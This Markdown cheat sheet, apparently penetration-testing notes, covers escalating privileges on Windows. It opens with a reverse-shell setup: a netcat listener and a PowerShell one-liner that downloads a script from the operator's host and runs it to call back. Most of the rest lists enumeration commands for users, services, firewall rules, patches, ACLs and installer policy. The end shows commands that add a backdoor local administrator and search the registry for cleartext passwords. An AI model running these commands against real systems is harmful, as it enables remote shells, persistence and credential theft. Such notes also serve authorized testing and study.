# Windows Privilege Escalation

## Upgrade Shell

[Fully interactive reverse shell on Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#fully-interactive-reverse-shell-on-windows)

Server Side

``` bash
stty raw -echo; (stty size; cat) | sudo nc -lvnp myport
```

Client Side

``` bash
powershell IEX(IWR http://myip/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell myip myport
```

File [Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)

## User Enumeration

Current User

``` bash
whoami
```

``` bash
net user <username>
```

``` bash
whoami /groups
```

Other Users

``` bash
net user
```

``` bash
net localgroup administrators
```

Folder

``` bash
dir
```

Hostname

``` bash
hostname
```

## OS Version & Architecture

What's the OS? What version? What architecture?

``` bash
systeminfo
```

``` bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

## Processes and Services

``` bash
tasklist /SVC
```

## Networking Enumeration

``` bash
ipconfig /all
```

``` bash
route print
```

Active network connection

``` bash
netstat -ano
```

## Firewall Status and Rules

``` bash
netsh advfirewall show currentprofile
```

``` bash
netsh advfirewall firewall show rule name=all
```

## Scheduled Tasks

``` bash
schtasks /query /fo LIST /v
```

``` bash
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Next Run Time" /C:"Last Run Time" /C:"Schedule Type" /C:"Start Time" /C:"Start Date"
```

## Installed and Patch Levels

``` bash
wmic product get name, version, vendor
```

``` bash
dir "C:\Program Files"
```

``` bash
dir "C:\Program Files (x86)"
```

Patch Levels

``` bash
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

## Readable/Writable

``` bash
accesschk.exe -accepteula
```

``` bash
accesschk.exe -uws <user> "C:\Program Files"
```

Using powershell >>>

``` bash
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

``` bash
Get-ChildItem "C:\Users\windows_10_1903_x64\Desktop" -Recurse | Get-ACL | findstr /C:"<user-name>"
```

## Unmounted Disks

``` bash
mountvol
```

## Device Drivers & Kernel Modules

Using powershell >>>

``` bash
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

``` bash
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

## Binaries That AutoElevate

### AlwaysInstallElevated

``` bash
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

``` bash
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

``` bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

## Enumeration Tools

[windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)

``` bash
windows-privesc-check2.exe --help
```

[winPEASexe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries)

``` bash
winPEASx86.exe
```

## More Reference

[https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated)

### Add Local Admin User

``` bash
net user /add <user> <pass>
```

``` bash
net localgroup administrators <user> /add
```

### Run CMD as Admin

``` bash
powershell.exe Start-Process cmd.exe -Verb runAs
```

### Clear text stored

``` bash
reg query HKLM /f pass /t REG_SZ /s
```